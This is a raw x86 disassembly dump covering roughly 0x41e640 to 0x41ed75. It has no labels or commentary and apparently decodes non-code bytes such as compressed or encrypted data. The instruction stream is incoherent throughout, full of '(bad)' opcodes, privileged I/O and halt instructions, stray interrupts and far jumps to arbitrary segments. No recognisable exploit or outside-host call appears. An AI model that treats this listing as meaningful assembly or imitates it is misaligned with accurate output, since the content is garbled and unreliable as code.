  41e640:	in     eax,0xcd
  41e642:	sbb    esi,DWORD PTR [edx]
  41e644:	ds nop
  41e646:	fiadd  DWORD PTR [ecx+0x55]
  41e649:	loope  0x41e5d8
  41e64b:	sbb    ebx,DWORD PTR [eax]
  41e64d:	and    bh,BYTE PTR [ecx-0x683ba4e1]
  41e653:	or     DWORD PTR [ebp-0x4a7b29a5],esi
  41e659:	inc    ecx
  41e65a:	jp     0x41e6a3
  41e65c:	imul   eax,DWORD PTR [edx-0x12],0xc2d2fa71
  41e663:	(bad)  
  41e664:	adc    eax,0xb8a45e0c
  41e669:	lods   al,BYTE PTR ds:[esi]
  41e66a:	mov    dl,0x49
  41e66c:	leave  
  41e66d:	repz inc edi
  41e66f:	sub    al,0x67
  41e671:	pusha  
  41e672:	mov    WORD PTR [ebx-0x3c],ss
  41e675:	stos   DWORD PTR es:[edi],eax
  41e676:	dec    ebp
  41e677:	jmp    0xf21bae85
  41e67c:	pop    ecx
  41e67d:	sti    
  41e67e:	(bad)  
  41e67f:	cwde   
  41e680:	cmp    DWORD PTR [edx],ecx
  41e682:	in     eax,dx
  41e683:	sub    BYTE PTR [eax+0x65e8da1f],dl
  41e689:	nop
  41e68a:	sub    al,BYTE PTR [esi]
  41e68c:	and    BYTE PTR ds:0x3d83b751,ch
  41e692:	jmp    0x80ce:0x494dd3d0
  41e699:	cs cs and al,0x72
  41e69d:	lahf   
  41e69e:	ja     0x41e703
  41e6a0:	ss (bad) 
  41e6a2:	data16 or BYTE PTR [ebx+0x42bab7ce],cl
  41e6a9:	stos   DWORD PTR es:[edi],eax
  41e6aa:	sub    ch,BYTE PTR [ebx]
  41e6ac:	dec    esp
  41e6ad:	icebp  
  41e6ae:	jne    0x41e6ec
  41e6b0:	cmc    
  41e6b1:	call   0xdc3120
  41e6b6:	sar    DWORD PTR [edx],1
  41e6b8:	push   ebx
  41e6b9:	enter  0x84f0,0x20
  41e6bd:	das    
  41e6be:	mov    eax,DWORD PTR [edx-0x3a]
  41e6c1:	xchg   edx,eax
  41e6c2:	push   ebx
  41e6c3:	add    eax,0xcb316ac6
  41e6c8:	add    al,0x86
  41e6ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6cb:	jge    0x41e6ad
  41e6cd:	or     dl,BYTE PTR [edi]
  41e6cf:	outs   dx,DWORD PTR ds:[esi]
  41e6d0:	dec    edi
  41e6d1:	popa   
  41e6d2:	or     eax,0x30102fef
  41e6d7:	int    0x7b
  41e6d9:	jp     0x41e72b
  41e6db:	cdq    
  41e6dc:	lea    edx,[bx+di+0x6b40]
  41e6e1:	push   edi
  41e6e2:	push   edx
  41e6e3:	gs push ds
  41e6e5:	sbb    eax,0x5cced000
  41e6ea:	neg    DWORD PTR [eax]
  41e6ec:	daa    
  41e6ed:	push   ebp
  41e6ee:	jmp    0xff27:0xfa20d232
  41e6f5:	mov    al,0xd9
  41e6f7:	adc    al,dl
  41e6f9:	jae    0x41e6d4
  41e6fb:	loop   0x41e741
  41e6fd:	in     eax,dx
  41e6fe:	xchg   edi,eax
  41e6ff:	push   esp
  41e700:	retf   0x2376
  41e703:	fbld   TBYTE PTR [edi-0x6d]
  41e706:	dec    ecx
  41e707:	neg    BYTE PTR ds:0x718637c2
  41e70d:	push   es
  41e70e:	das    
  41e70f:	mov    edi,0xe30e500
  41e714:	inc    ecx
  41e715:	pop    ebp
  41e716:	ss cmc 
  41e718:	inc    BYTE PTR [ebp+ebx*2-0x12096e44]
  41e71f:	add    esi,DWORD PTR [eax]
  41e721:	pop    esp
  41e722:	in     al,0xac
  41e724:	retf   
  41e725:	and    al,0x80
  41e727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e728:	sub    BYTE PTR [edx+ecx*4],bh
  41e72b:	stos   DWORD PTR es:[edi],eax
  41e72c:	rol    DWORD PTR [edx-0x6f5ba4b1],0xd3
  41e733:	retf   0x810c
  41e736:	enter  0xe5b3,0x3d
  41e73a:	scas   eax,DWORD PTR es:[edi]
  41e73b:	popa   
  41e73c:	(bad)  
  41e73d:	in     al,dx
  41e73e:	cmc    
  41e73f:	into   
  41e740:	ss hlt 
  41e742:	(bad)  
  41e744:	enter  0x2cbc,0x3b
  41e748:	add    DWORD PTR [edx-0x42],edx
  41e74b:	hlt    
  41e74c:	add    BYTE PTR [esi],cl
  41e74e:	inc    ecx
  41e74f:	xchg   ebx,eax
  41e750:	and    DWORD PTR [edi-0x22],edi
  41e753:	ds sub eax,0xa2964f04
  41e759:	xchg   edi,eax
  41e75a:	jae    0x41e6f2
  41e75c:	sbb    BYTE PTR [edx],cl
  41e75e:	and    dl,BYTE PTR [ecx+0x3af66c5c]
  41e764:	adc    ch,BYTE PTR [esp+eiz*8+0x70]
  41e768:	mov    ebx,0xef13674a
  41e76d:	pop    esp
  41e76e:	cmp    al,0xb8
  41e770:	jmp    0x41e740
  41e772:	add    DWORD PTR [edi-0x7],ebx
  41e775:	mov    edx,0x404e54f5
  41e77a:	xor    edx,0x26
  41e77d:	imul   eax,edi,0xe754da29
  41e783:	jle    0x41e750
  41e785:	div    BYTE PTR [edi]
  41e787:	hlt    
  41e788:	xlat   BYTE PTR ds:[ebx]
  41e789:	push   ss
  41e78a:	sub    DWORD PTR [ecx-0x48bab110],esi
  41e790:	jne    0x41e80a
  41e792:	imul   ebp,esi,0x8cedb286
  41e798:	add    cl,ah
  41e79a:	popf   
  41e79b:	(bad)  
  41e79c:	popa   
  41e79d:	nop
  41e79e:	into   
  41e79f:	mov    ?,WORD PTR ds:[eax+0x6498ad12]
  41e7a6:	popf   
  41e7a7:	inc    edi
  41e7a8:	in     al,dx
  41e7a9:	std    
  41e7aa:	lods   al,BYTE PTR ds:[esi]
  41e7ab:	jg     0x41e765
  41e7ad:	push   edx
  41e7ae:	int3   
  41e7af:	pop    es
  41e7b0:	addr16 jmp 0x41e7cb
  41e7b3:	lock lds ebx,FWORD PTR [edx+0x14]
  41e7b7:	lahf   
  41e7b8:	test   BYTE PTR [edi+0x1c],al
  41e7bb:	mov    BYTE PTR [edi-0x67542ce3],dl
  41e7c1:	aaa    
  41e7c2:	lahf   
  41e7c3:	mov    esp,0xdce100ff
  41e7c8:	mov    edx,0xfbb8b3e2
  41e7cd:	jnp    0x41e82c
  41e7cf:	or     BYTE PTR [ebx-0x644c62c2],0x8e
  41e7d6:	mov    ?,WORD PTR [esi+edx*8-0x30]
  41e7da:	pop    ebx
  41e7db:	xor    BYTE PTR [edi],0x57
  41e7de:	mov    edx,0xdc160605
  41e7e3:	pusha  
  41e7e4:	ret    0x1d8a
  41e7e7:	xchg   ebx,edi
  41e7e9:	call   0x3e:0x5df91b03
  41e7f0:	test   al,0x30
  41e7f2:	retf   0x1faa
  41e7f5:	call   0x987a890
  41e7fa:	int3   
  41e7fb:	sub    ebx,DWORD PTR [edx+0x48]
  41e7fe:	(bad)  
  41e7ff:	(bad)  
  41e800:	stos   DWORD PTR es:[edi],eax
  41e801:	addr16 inc eax
  41e803:	fwait
  41e804:	sti    
  41e805:	pop    ds
  41e806:	push   ds
  41e807:	sub    BYTE PTR [ebx+0x16d0625],dh
  41e80d:	stos   DWORD PTR es:[edi],eax
  41e80e:	int3   
  41e80f:	sub    BYTE PTR [ecx-0x48031a24],0xd2
  41e816:	ror    BYTE PTR [edx+0x9c7a3a2],1
  41e81c:	out    0xb1,al
  41e81e:	xor    BYTE PTR [eax+0x190f2a8a],bl
  41e824:	inc    eax
  41e825:	push   ebx
  41e826:	rol    bl,1
  41e828:	cmp    al,0xdb
  41e82a:	ins    BYTE PTR es:[edi],dx
  41e82b:	aaa    
  41e82c:	sub    al,0x2c
  41e82e:	scas   al,BYTE PTR es:[edi]
  41e82f:	ret    
  41e830:	test   al,0x86
  41e832:	shr    ecx,cl
  41e834:	jp     0x41e87f
  41e836:	mul    edi
  41e838:	add    al,0x2b
  41e83a:	fmul   QWORD PTR [edi+0x6]
  41e83d:	push   0xffffffeb
  41e83f:	ret    
  41e840:	xchg   DWORD PTR [ebx+edx*1-0x3d],edx
  41e844:	push   edi
  41e845:	xchg   ecx,eax
  41e846:	add    eax,0x40c1211d
  41e84b:	add    esi,ebp
  41e84d:	jo     0x41e897
  41e84f:	jmp    0x363e:0x9c220615
  41e856:	imul   esp,DWORD PTR [eax-0x632563e6],0x2be62cf3
  41e860:	test   al,0xd1
  41e862:	dec    ecx
  41e863:	icebp  
  41e864:	pushf  
  41e865:	xor    ebp,DWORD PTR [ebx+0x5f08c860]
  41e86b:	aam    0x7d
  41e86d:	neg    BYTE PTR [eax-0x40]
  41e870:	int    0x38
  41e872:	dec    edx
  41e873:	mov    bl,0xec
  41e875:	push   ebx
  41e876:	inc    ebx
  41e877:	(bad)  
  41e878:	(bad)  
  41e87a:	rcr    DWORD PTR [esi-0x2c],0xa3
  41e87e:	push   cs
  41e87f:	mov    ds:0x23d1610e,al
  41e884:	int    0x30
  41e886:	jp     0x41e8ce
  41e888:	aad    0xe0
  41e88a:	int    0x62
  41e88c:	int    0xce
  41e88e:	pop    eax
  41e88f:	scas   al,BYTE PTR es:[edi]
  41e890:	js     0x41e88c
  41e892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e893:	in     eax,0x99
  41e895:	arpl   bx,di
  41e897:	fwait
  41e898:	xchg   ebp,eax
  41e899:	call   0xe0295399
  41e89e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e89f:	ins    BYTE PTR es:[edi],dx
  41e8a0:	cwde   
  41e8a1:	sub    ebx,DWORD PTR [edi]
  41e8a3:	mov    dh,0x2
  41e8a5:	jecxz  0x41e914
  41e8a7:	sbb    ebp,ecx
  41e8a9:	cwde   
  41e8aa:	loope  0x41e8b9
  41e8ac:	jns    0x41e8cd
  41e8ae:	adc    al,0x20
  41e8b0:	fprem  
  41e8b2:	imul   ecx,ecx,0x7c13ba6c
  41e8b8:	push   ecx
  41e8b9:	mov    dh,0x9b
  41e8bb:	clc    
  41e8bc:	(bad)  
  41e8bd:	leave  
  41e8be:	adc    ch,dl
  41e8c0:	dec    BYTE PTR [eax]
  41e8c2:	add    eax,0xa1d96821
  41e8c7:	sub    al,0xc4
  41e8c9:	stc    
  41e8ca:	lea    ebx,[ecx-0xf]
  41e8cd:	or     bl,BYTE PTR [edi+0x55622f63]
  41e8d3:	mov    al,0x90
  41e8d5:	inc    esi
  41e8d6:	and    ebx,DWORD PTR [ebp-0x7f8f6d35]
  41e8dc:	stc    
  41e8dd:	jl     0x41e865
  41e8df:	xor    eax,0x91ea719f
  41e8e4:	cmp    esp,0xffffffc5
  41e8e7:	and    DWORD PTR [edx-0x48f4e92b],ecx
  41e8ed:	jecxz  0x41e8e6
  41e8ef:	test   BYTE PTR [ecx],al
  41e8f1:	daa    
  41e8f2:	jp     0x41e8ef
  41e8f4:	cwde   
  41e8f5:	int    0x74
  41e8f7:	scas   al,BYTE PTR es:[edi]
  41e8f8:	test   BYTE PTR [esi-0x7430ad1e],cl
  41e8fe:	jo     0x41e8ec
  41e900:	loopne 0x41e95a
  41e902:	ret    0x3eda
  41e905:	sub    al,0x2a
  41e907:	(bad)  
  41e908:	sub    al,0xa6
  41e90a:	pop    ebp
  41e90b:	lds    edx,FWORD PTR [eax]
  41e90d:	out    dx,al
  41e90e:	mov    bl,0x3d
  41e910:	lods   eax,DWORD PTR ds:[esi]
  41e911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e912:	jne    0x41e8b5
  41e914:	les    ecx,FWORD PTR [ecx]
  41e916:	fs xchg ebp,eax
  41e918:	pop    edi
  41e919:	scas   al,BYTE PTR es:[edi]
  41e91a:	outs   dx,DWORD PTR ds:[esi]
  41e91b:	(bad)  
  41e91c:	test   BYTE PTR [ecx+0x40],ah
  41e91f:	mul    BYTE PTR [edi+eax*2+0x3d]
  41e923:	js     0x41e942
  41e925:	bound  esi,QWORD PTR [edx]
  41e927:	jmp    0xbd1fa227
  41e92c:	aad    0x16
  41e92e:	mov    esp,DWORD PTR [edx+0x6f]
  41e931:	add    ebx,DWORD PTR [ebx+esi*8+0x10]
  41e935:	dec    edi
  41e936:	(bad)  
  41e937:	mov    edx,0x7c2f51d4
  41e93c:	scas   al,BYTE PTR es:[edi]
  41e93d:	xor    bh,cl
  41e93f:	ret    0xa217
  41e942:	and    eax,0x76b9efc9
  41e947:	mov    esp,0x1102640b
  41e94c:	jle    0x41e906
  41e94e:	and    DWORD PTR [ebx+edx*2+0x1c],ebp
  41e952:	pop    ecx
  41e953:	dec    eax
  41e954:	scas   al,BYTE PTR es:[edi]
  41e955:	ss in  eax,dx
  41e957:	adc    ebx,esi
  41e959:	mov    BYTE PTR ds:0xc5d3c8a5,bh
  41e95f:	test   DWORD PTR [esi-0x1fefa83f],0x3abbbc74
  41e969:	mov    edi,0x485c365f
  41e96e:	cli    
  41e96f:	and    BYTE PTR [ebp-0x3f],bh
  41e972:	jo     0x41e977
  41e974:	fdiv   QWORD PTR [ecx]
  41e976:	imul   ebp,DWORD PTR [ecx],0x47d56c0f
  41e97c:	das    
  41e97d:	inc    edx
  41e97e:	in     al,0x91
  41e980:	loopne 0x41e96f
  41e982:	jnp    0x41e9e9
  41e984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e985:	sbb    dl,BYTE PTR [ebx-0x24]
  41e988:	mov    bh,0x40
  41e98a:	xor    eax,ebx
  41e98c:	pushf  
  41e98d:	cld    
  41e98e:	ja     0x41e922
  41e990:	adc    eax,0x199f1bd5
  41e995:	ds inc ebp
  41e997:	jb     0x41e9f9
  41e999:	jb     0x41e9db
  41e99b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e99c:	test   BYTE PTR [ecx+0x60265dd1],al
  41e9a2:	sub    al,0xed
  41e9a4:	push   ss
  41e9a5:	pop    es
  41e9a6:	sub    ebx,ecx
  41e9a8:	loop   0x41e989
  41e9aa:	shl    DWORD PTR [esi-0x564a336f],cl
  41e9b0:	xor    DWORD PTR [eax+edi*4-0xf],edi
  41e9b4:	std    
  41e9b5:	xchg   BYTE PTR [ebx+0x5f],bh
  41e9b8:	mov    ebx,0xf9a2fca
  41e9bd:	xor    edx,edi
  41e9bf:	std    
  41e9c0:	dec    edi
  41e9c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9c2:	pop    esi
  41e9c3:	mov    WORD PTR [edi],ds
  41e9c5:	ret    0xa721
  41e9c8:	and    eax,0xfab6b556
  41e9cd:	mov    ecx,0x1ac1596
  41e9d2:	sub    BYTE PTR [edx+0x58221fe],dh
  41e9d8:	lahf   
  41e9d9:	fdiv   DWORD PTR [esi+0xc]
  41e9dc:	sub    al,0xc9
  41e9de:	add    ah,BYTE PTR [ecx+0x43]
  41e9e1:	test   eax,0x1de910d2
  41e9e6:	fisttp QWORD PTR [edi+eiz*4]
  41e9e9:	mov    BYTE PTR [ebx],cl
  41e9eb:	jmp    0x44ea:0x2d707a5f
  41e9f2:	(bad)  
  41e9f3:	lahf   
  41e9f4:	sub    al,ch
  41e9f6:	inc    esp
  41e9f7:	or     eax,0x72a1d909
  41e9fc:	je     0x41ea79
  41e9fe:	mov    eax,0x2f555651
  41ea03:	pop    esi
  41ea04:	dec    ebx
  41ea05:	cmc    
  41ea06:	jle    0x41ea3d
  41ea08:	dec    ebx
  41ea09:	push   ebx
  41ea0a:	pushf  
  41ea0b:	shl    DWORD PTR [edx],1
  41ea0d:	repz mov cl,0x1d
  41ea10:	push   cs
  41ea11:	fdiv   QWORD PTR [edx-0x4]
  41ea14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea15:	inc    esi
  41ea16:	fadd   st,st(6)
  41ea18:	js     0x41ea5d
  41ea1a:	neg    dl
  41ea1c:	pop    edi
  41ea1d:	rcl    BYTE PTR [edx+ebx*8-0x2f45fefb],1
  41ea24:	das    
  41ea25:	aad    0x74
  41ea27:	iret   
  41ea28:	int    0xc8
  41ea2a:	push   cs
  41ea2b:	popf   
  41ea2c:	dec    esi
  41ea2d:	mul    DWORD PTR [edx+0x56407b47]
  41ea33:	cli    
  41ea34:	push   ds
  41ea35:	lods   al,BYTE PTR ds:[esi]
  41ea36:	out    0xfa,eax
  41ea38:	or     ch,dh
  41ea3a:	sub    al,0xce
  41ea3c:	xchg   BYTE PTR [ebx+ebx*2],ch
  41ea3f:	push   ebx
  41ea40:	jge    0x41e9e0
  41ea42:	xor    eax,0x29e0aea1
  41ea47:	xchg   esi,eax
  41ea48:	das    
  41ea49:	mov    ecx,0xce39985e
  41ea4e:	xor    DWORD PTR gs:[ecx],ecx
  41ea51:	add    DWORD PTR [eax+0x34],edi
  41ea54:	and    al,0xa1
  41ea56:	cmp    edi,DWORD PTR [ebx+0x74547522]
  41ea5c:	shr    DWORD PTR [ebx-0x7c],cl
  41ea5f:	sahf   
  41ea60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea61:	outs   dx,DWORD PTR ds:[esi]
  41ea62:	shr    BYTE PTR [edx+0x7871298],0xb6
  41ea69:	xor    al,0x53
  41ea6b:	inc    esp
  41ea6c:	mov    esi,0x760754c9
  41ea71:	js     0x41eabc
  41ea73:	and    eax,0x45fcd9cd
  41ea78:	repz and eax,0xda7f8a30
  41ea7e:	cli    
  41ea7f:	pop    ds
  41ea80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea81:	cmp    bl,dh
  41ea83:	mov    esp,0x15c0d0fb
  41ea88:	popf   
  41ea89:	arpl   WORD PTR [edi],cx
  41ea8b:	push   esi
  41ea8c:	cmp    BYTE PTR [edi],ch
  41ea8e:	mov    cl,0x9a
  41ea90:	add    bh,BYTE PTR [eax]
  41ea92:	add    DWORD PTR [ecx+0x37],ebx
  41ea95:	push   edx
  41ea96:	sub    eax,0x2bfa2577
  41ea9b:	and    bl,ch
  41ea9d:	fisub  WORD PTR [edx+esi*8]
  41eaa0:	pop    ebp
  41eaa1:	sub    eax,0xccd80b4f
  41eaa6:	add    eax,DWORD PTR [edx]
  41eaa8:	and    DWORD PTR [ebx-0x1a32cd14],ebp
  41eaae:	icebp  
  41eaaf:	jge    0x41eb19
  41eab1:	fcmove st,st(2)
  41eab3:	ja     0x41eadc
  41eab5:	push   eax
  41eab6:	jl     0x41eac8
  41eab8:	out    0xdf,al
  41eaba:	add    al,0x7a
  41eabc:	jno    0x41ea7d
  41eabe:	cli    
  41eabf:	xchg   eax,eax
  41eac1:	mov    ds:0x4787f5c0,eax
  41eac6:	cld    
  41eac7:	in     eax,dx
  41eac8:	(bad)  [eax]
  41eaca:	test   BYTE PTR [esi+0x37],cl
  41eacd:	mov    ds:0x60108a3,al
  41ead2:	(bad)  
  41ead3:	dec    edi
  41ead4:	sti    
  41ead5:	mov    dh,0x58
  41ead7:	icebp  
  41ead8:	inc    esp
  41ead9:	push   ds
  41eada:	test   eax,0xae439833
  41eadf:	mov    dl,0x74
  41eae1:	out    dx,eax
  41eae2:	in     eax,dx
  41eae3:	jge    0x41eb0e
  41eae5:	mov    ch,0xfa
  41eae7:	stc    
  41eae8:	mov    al,0xca
  41eaea:	retf   0x1d03
  41eaed:	into   
  41eaee:	adc    BYTE PTR ds:0x7122e0e6,dl
  41eaf4:	aam    0xce
  41eaf6:	repz adc bh,BYTE PTR [ebp+0x342a3afc]
  41eafd:	cdq    
  41eafe:	inc    esi
  41eaff:	jl     0x41eaf6
  41eb01:	mov    ebp,0x9316332e
  41eb06:	inc    ecx
  41eb07:	push   ebx
  41eb08:	cwde   
  41eb09:	mov    ss,WORD PTR [edx+0x52]
  41eb0c:	pop    edi
  41eb0d:	add    ah,bh
  41eb0f:	or     edx,DWORD PTR [eax]
  41eb11:	or     DWORD PTR ds:0xe4e52a79,ecx
  41eb17:	into   
  41eb18:	cmp    ebp,DWORD PTR [ebp+0x27]
  41eb1b:	test   eax,0x8e50371d
  41eb20:	lods   al,BYTE PTR ds:[esi]
  41eb21:	stos   BYTE PTR es:[edi],al
  41eb22:	loopne 0x41eaa9
  41eb24:	cmc    
  41eb25:	mov    ebp,0xc5cf2c9a
  41eb2a:	int    0xf2
  41eb2c:	dec    edi
  41eb2d:	ins    DWORD PTR es:[edi],dx
  41eb2e:	or     DWORD PTR ds:0x6168abe9,ebx
  41eb34:	lock sub eax,ebx
  41eb37:	mov    al,ds:0xbed6aa37
  41eb3c:	cmp    al,0x10
  41eb3e:	ficomp DWORD PTR [eax+edi*4-0x17]
  41eb42:	lock cmp al,0x8d
  41eb45:	leave  
  41eb46:	jns    0x41eb12
  41eb48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb49:	out    0x6e,eax
  41eb4b:	xchg   DWORD PTR [ebp+0x31],ebp
  41eb4e:	popa   
  41eb4f:	je     0x41eb34
  41eb51:	cs repnz retf 0x1608
  41eb56:	test   DWORD PTR [ebx],ecx
  41eb58:	push   esp
  41eb59:	push   ds
  41eb5a:	mov    ds:0x76d78393,al
  41eb5f:	es xor eax,DWORD PTR fs:[edx+0x68]
  41eb64:	sub    eax,0x5b612138
  41eb69:	cmp    BYTE PTR [ebx-0x60],bl
  41eb6c:	lds    esi,FWORD PTR [bp+di+0x39e9]
  41eb71:	dec    eax
  41eb72:	push   edi
  41eb73:	sub    eax,0x62fda691
  41eb78:	test   BYTE PTR [ebp+0xbcbc05],bl
  41eb7e:	pop    esp
  41eb7f:	ss ds aad 0xd0
  41eb83:	jg     0x41eb53
  41eb85:	dec    ebp
  41eb86:	mov    al,0x53
  41eb88:	ret    0x5e7
  41eb8b:	push   0x5a
  41eb8d:	fild   QWORD PTR [esi-0x3e]
  41eb90:	(bad)  
  41eb91:	jl     0x41ec03
  41eb93:	and    al,0x26
  41eb95:	add    edx,DWORD PTR [esp+esi*4+0x38]
  41eb99:	adc    edi,edi
  41eb9b:	inc    ecx
  41eb9c:	sbb    al,0xf0
  41eb9e:	hlt    
  41eb9f:	cmp    BYTE PTR [edx+0x3e75fa0d],0xe7
  41eba6:	push   ebp
  41eba7:	and    ebp,DWORD PTR [esi-0x49]
  41ebaa:	fwait
  41ebab:	pop    esi
  41ebac:	les    esp,FWORD PTR [edi-0x2b2405c6]
  41ebb2:	adc    DWORD PTR [edi],edx
  41ebb4:	pop    edx
  41ebb5:	mov    WORD PTR [edx-0x51],fs
  41ebb8:	jns    0x41ebf3
  41ebba:	xchg   BYTE PTR [ecx-0x2f5d1491],ch
  41ebc0:	push   ebx
  41ebc1:	cmp    DWORD PTR [esi+0x9],0xffffff80
  41ebc5:	xchg   ebp,eax
  41ebc6:	fwait
  41ebc7:	cmc    
  41ebc8:	cld    
  41ebc9:	push   es
  41ebca:	sbb    ebp,DWORD PTR [ebp-0x1ec55f69]
  41ebd0:	fistp  QWORD PTR [ecx+0x10]
  41ebd3:	xor    dl,ch
  41ebd5:	jno    0x41eb9d
  41ebd7:	xchg   ebp,eax
  41ebd8:	daa    
  41ebd9:	sub    DWORD PTR [edi-0x19],edx
  41ebdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebdd:	adc    eax,DWORD PTR [edi+ecx*8]
  41ebe0:	or     al,0xfd
  41ebe3:	daa    
  41ebe4:	mov    esi,DWORD PTR [esi+ebx*4+0x8]
  41ebe8:	sub    DWORD PTR [ecx],eax
  41ebea:	jl     0x41ebc7
  41ebec:	mov    ecx,0x4abf0008
  41ebf1:	dec    eax
  41ebf2:	xchg   esi,eax
  41ebf3:	sbb    esp,DWORD PTR [ebx+0x2990fcf7]
  41ebf9:	pop    esi
  41ebfa:	mov    bh,0x12
  41ebfc:	pushf  
  41ebfd:	stc    
  41ebfe:	or     BYTE PTR [eax+0x2d],0xe6
  41ec02:	jmp    0x41ec38
  41ec04:	dec    ebp
  41ec05:	ds push esp
  41ec07:	dec    esi
  41ec08:	rcl    DWORD PTR [ebx+0x30a25a9f],1
  41ec0e:	push   esi
  41ec0f:	push   0x58
  41ec11:	nop
  41ec12:	cmc    
  41ec13:	push   ebx
  41ec14:	xchg   edx,eax
  41ec15:	jns    0x41ebd8
  41ec17:	adc    eax,0x910a8d98
  41ec1c:	ss xchg esi,eax
  41ec1e:	inc    edi
  41ec1f:	mov    BYTE PTR [ecx],dh
  41ec21:	mov    al,ds:0x7190f42c
  41ec26:	inc    esp
  41ec27:	pop    esp
  41ec28:	add    DWORD PTR [ebx+0x4843147d],esp
  41ec2e:	ja     0x41ec04
  41ec30:	sahf   
  41ec31:	inc    edi
  41ec32:	and    BYTE PTR [edi-0x2c],al
  41ec35:	repz and esi,DWORD PTR [esi-0x63]
  41ec39:	fwait
  41ec3a:	and    DWORD PTR [esi-0x2f],0x413d6428
  41ec41:	push   ebp
  41ec42:	mov    ds:0x7adef4f9,al
  41ec47:	mov    ds:0x877ffb82,al
  41ec4c:	sbb    DWORD PTR [edx-0x60899de3],ecx
  41ec52:	mov    eax,0x2ba6753
  41ec57:	call   0x54d808bf
  41ec5c:	out    0x82,al
  41ec5e:	jg     0x41ec33
  41ec60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec61:	mov    ecx,0x7b05db9f
  41ec66:	dec    ebx
  41ec67:	(bad)  
  41ec69:	or     ch,bh
  41ec6b:	sbb    esp,DWORD PTR [ecx+0x16]
  41ec6e:	add    BYTE PTR [esi],cl
  41ec70:	in     al,0x1e
  41ec72:	enter  0x8a33,0xb4
  41ec76:	jne    0x41ec54
  41ec78:	bswap  ecx
  41ec7a:	or     ebp,DWORD PTR [edx+0x4c]
  41ec7d:	pop    edx
  41ec7e:	cmp    eax,0xdfe67b43
  41ec83:	nop
  41ec84:	mov    eax,0xfa0a22be
  41ec89:	inc    ebp
  41ec8a:	retf   0x24d5
  41ec8d:	hlt    
  41ec8e:	call   0x6aa3dab4
  41ec93:	pop    ecx
  41ec94:	mov    ebp,0x9cb30cd6
  41ec99:	idiv   DWORD PTR [edi-0x63677474]
  41ec9f:	inc    ebp
  41eca0:	outs   dx,DWORD PTR ds:[esi]
  41eca1:	pop    ecx
  41eca2:	dec    ecx
  41eca3:	iret   
  41eca4:	pusha  
  41eca5:	test   BYTE PTR [edi],bh
  41eca7:	or     DWORD PTR [edi+ebx*1+0x5f],edi
  41ecab:	or     al,0xf5
  41ecad:	inc    eax
  41ecae:	outs   dx,DWORD PTR ds:[esi]
  41ecaf:	fstp   TBYTE PTR [eax+0x39]
  41ecb2:	jl     0x41eca6
  41ecb4:	sub    DWORD PTR [ebx-0x1526e09d],eax
  41ecba:	js     0x41ecd4
  41ecbc:	sbb    al,0xb7
  41ecbe:	cs pop edx
  41ecc0:	adc    DWORD PTR [edi+0x45],ebx
  41ecc3:	mov    BYTE PTR [ebp-0x5e],dh
  41ecc6:	lods   al,BYTE PTR ds:[esi]
  41ecc7:	inc    ebx
  41ecc8:	sbb    dl,bl
  41ecca:	mov    bl,ah
  41eccc:	fst    QWORD PTR [ebp-0xdb97f1c]
  41ecd2:	pop    edx
  41ecd3:	cs pop edx
  41ecd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecd6:	pop    edi
  41ecd7:	jno    0x41ec79
  41ecd9:	sub    eax,0xbfe69588
  41ecde:	dec    esi
  41ecdf:	jmp    0x747caccf
  41ece4:	or     BYTE PTR [ebx-0x15],bl
  41ece7:	sbb    eax,0x8da4df3d
  41ecec:	mov    ch,0xbb
  41ecee:	daa    
  41ecef:	sbb    al,BYTE PTR [esi]
  41ecf1:	inc    esp
  41ecf2:	dec    ecx
  41ecf3:	(bad)  
  41ecf4:	pop    ss
  41ecf5:	cmp    bh,bh
  41ecf7:	and    BYTE PTR ds:0xef57bf00,dl
  41ecfd:	sti    
  41ecfe:	fbstp  TBYTE PTR [ebx+0xdae7693]
  41ed04:	add    al,0xb8
  41ed06:	mov    WORD PTR [eax-0x7],fs
  41ed09:	fisttp DWORD PTR [eax+ebp*4-0x44]
  41ed0d:	fisubr DWORD PTR [edi]
  41ed0f:	mov    WORD PTR [ebx+0xe],fs
  41ed12:	outs   dx,DWORD PTR ds:[esi]
  41ed13:	cmc    
  41ed14:	nop
  41ed15:	cmp    bl,BYTE PTR [edi-0x3e]
  41ed18:	xchg   esi,eax
  41ed19:	xchg   ebp,eax
  41ed1a:	sub    BYTE PTR [edi],dh
  41ed1c:	and    eax,0x6ce6ea71
  41ed21:	push   eax
  41ed22:	jo     0x41ecd4
  41ed24:	loope  0x41ed71
  41ed26:	retf   
  41ed27:	xor    BYTE PTR [edi+0x20],0x91
  41ed2b:	fsub   st,st(4)
  41ed2d:	lock push eax
  41ed2f:	lock lods al,BYTE PTR ds:[esi]
  41ed31:	sbb    eax,0xde9369b1
  41ed36:	mov    dh,0xf9
  41ed38:	je     0x41ed65
  41ed3a:	fs mov eax,0xde5f9585
  41ed40:	imul   edx,ebx,0x6b
  41ed43:	fmul   st,st(4)
  41ed45:	sbb    BYTE PTR [edi-0x74b4b39f],dl
  41ed4b:	cmp    esi,edx
  41ed4d:	mov    BYTE PTR [esi],0xfa
  41ed50:	bound  ebp,QWORD PTR [edi-0x66e72515]
  41ed56:	rol    DWORD PTR [esi+0x36],cl
  41ed59:	cmp    eax,0x2cb18ff4
  41ed5e:	in     al,0x91
  41ed60:	scas   al,BYTE PTR es:[edi]
  41ed61:	out    0x0,eax
  41ed63:	lea    edi,[ecx-0x3891745a]
  41ed69:	push   ss
  41ed6a:	pop    ds
  41ed6b:	push   cs
  41ed6c:	stos   BYTE PTR es:[edi],al
  41ed6d:	dec    edi
  41ed6e:	jne    0x41ed90
  41ed70:	jne    0x41ed9c
  41ed72:	jmp    FWORD PTR [esi+ebx*2]
  41ed75:	add    DWORD PTR [edi+eax*1-0x275c9456],edx
